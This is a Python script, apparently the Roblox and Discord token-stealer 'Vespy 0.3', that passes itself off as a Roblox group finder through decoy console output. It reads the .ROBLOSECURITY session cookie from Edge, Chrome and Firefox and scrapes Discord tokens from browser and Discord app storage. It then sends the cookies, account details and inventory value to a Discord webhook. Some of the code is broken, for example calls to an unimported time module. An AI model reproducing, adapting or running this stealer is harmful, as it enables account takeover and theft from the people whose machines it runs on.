
import browser_cookie3
import requests
import os
import re
import random, string
import subprocess
from os import system
from time import sleep
from colorama import Fore, init, Style, Back
from PIL import Image, ImageFont, ImageDraw
from discord_webhook import DiscordWebhook, DiscordEmbed
from urllib.request import Request, urlopen
import getpass

webhooky = "s"
tokytoky = True
USER_NAME = getpass.getuser()
Banner = " "
Symbol = ''''''
system("mode con cols=70 lines=27")


try:
    ccookies = browser_cookie3.edge(domain_name='roblox.com')
    ccookies = str(ccookies)
    ccookie = ccookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":ccookie}).json()
    userid = userdata['id']
    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":ccookie}).json()
    username = userdata['name']
    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":ccookie}).json()
    while rap_dict['nextPageCursor'] != None:
        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":ccookie}).json()
    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
    image_url = thumbnail["data"][0]["imageUrl"]
    content = '@everyone !'
    webhook = DiscordWebhook(url=webhooky, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png",content=content)
    embed = DiscordEmbed(title="Vespy", description=f"Roblox Cookie", color='5200FF')
    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')
    embed.set_footer(text='vesper (c)')
    embed.set_timestamp()
    embed.add_embed_field(name="Username :", value=f"```{username}```", ineline=False)
    embed.add_embed_field(name="Premium :", value=f"```{premiumbool}```", ineline=False)
    embed.add_embed_field(name="Rap :", value=f"```{rap}```", ineline=False)
    embed.add_embed_field(name="Cookie :", value=f"```{ccookie}```", ineline=False)
    embed.set_thumbnail(url=image_url)
    webhook.add_embed(embed)
    response = webhook.execute()
except:pass
try:
    cookies2 = browser_cookie3.chrome(domain_name='roblox.com')
    cookies2 = str(cookies2)
    cookie2 = cookies2.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie2}).json()
    userid = userdata['id']
    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie2}).json()
    username = userdata['name']
    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie2}).json()
    while rap_dict['nextPageCursor'] != None:
        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie2}).json()
    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
    image_url = thumbnail["data"][0]["imageUrl"]
    content = '@everyone !'
    webhook = DiscordWebhook(url=webhooky, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png",content=content)
    embed = DiscordEmbed(title="Vespy", description=f"Roblox Cookie", color='5200FF')
    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')
    embed.set_footer(text='vesper (c)')
    embed.set_timestamp()
    embed.add_embed_field(name="Username :", value=f"```{username}```", ineline=False)
    embed.add_embed_field(name="Premium :", value=f"```{premiumbool}```", ineline=False)
    embed.add_embed_field(name="Rap :", value=f"```{rap}```", ineline=False)
    embed.add_embed_field(name="Cookie :", value=f"```{cookie2}```", ineline=False)
    embed.set_thumbnail(url=image_url)
    webhook.add_embed(embed)
    response = webhook.execute()
except:
    pass
try:
    cookies3 = browser_cookie3.firefox(domain_name='roblox.com')
    cookies3 = str(cookies3)
    cookie3 = cookies3.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie3}).json()
    userid = userdata['id']
    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie3}).json()
    username = userdata['name']
    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie3}).json()
    while rap_dict['nextPageCursor'] != None:
        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie3}).json()
    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
    image_url = thumbnail["data"][0]["imageUrl"]
    content = '@everyone !'
    webhook = DiscordWebhook(url=webhooky, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png",content=content)
    embed = DiscordEmbed(title="Vespy", description=f"Roblox Cookie", color='5200FF')
    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')
    embed.set_footer(text='vesper (c)')
    embed.set_timestamp()
    embed.add_embed_field(name="Username :", value=f"```{username}```", ineline=False)
    embed.add_embed_field(name="Premium :", value=f"```{premiumbool}```", ineline=False)
    embed.add_embed_field(name="Rap :", value=f"```{rap}```", ineline=False)
    embed.add_embed_field(name="Cookie :", value=f"```{cookie3}```", ineline=False)
    embed.set_thumbnail(url=image_url)
    webhook.add_embed(embed)
    response = webhook.execute()
except:
    pass
sleep(0.2)


        # lol
def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    def getheaders(token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers
    def getavatar(uid, aid):
        url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
        try:
            urlopen(Request(url))
        except:
            url = url[:-4]
        return url
    global tokytoky, webhooky
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                if r.status_code == 200:
                    j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
                    sleep(0.2)
                    user = j["username"] + "#" + str(j["discriminator"])
                    user_id = j["id"]
                    avatar_id = j["avatar"]
                    avatar_url2 = getavatar(user_id, avatar_id)
                    webhook = DiscordWebhook(url=webhooky, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png")
                    embed = DiscordEmbed(title="Vespy", description=f"Discord Account Info", color='5200FF')
                    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')
                    embed.set_footer(text='vesper (c)')
                    embed.set_timestamp()
                    embed.add_embed_field(name="Username :", value=f"```{user}```", ineline=False)
                    embed.add_embed_field(name="Tokens :", value=f"```{token}```", ineline=False)
                    embed.set_thumbnail(url=avatar_url2)
                    webhook.add_embed(embed)
    print(Fore.RED+"["+Fore.GREEN+"-"+Fore.RED+"]"+Fore.GREEN+r" 7364589,4,https://www.roblox.com/groups/7364589/--,'Epic Xbox Fun Games!' ")
    time.sleep(2)
    print(Fore.RED+"["+Fore.GREEN+"-"+Fore.RED+"]"+Fore.GREEN+r" 7379105,19,https://www.roblox.com/groups/7379105/--,'AMP ENT' ")
    time.sleep(2)
    print(Fore.RED+"["+Fore.GREEN+"-"+Fore.RED+"]"+Fore.GREEN+r" 7538744,8,https://www.roblox.com/groups/7538744/--,'obvkaylee' ")
    time.sleep(2)
    print(Fore.RED+"["+Fore.GREEN+"-"+Fore.RED+"]"+Fore.GREEN+r" 7802704,2,https://www.roblox.com/groups/7802704/--,'Midnight Fangs' ")
    time.sleep(2)
    print("[!] << END")
    print(Fore.GREEN+"====================================")
    timeout = input(Fore.RED+"[*] Task Has Ended")
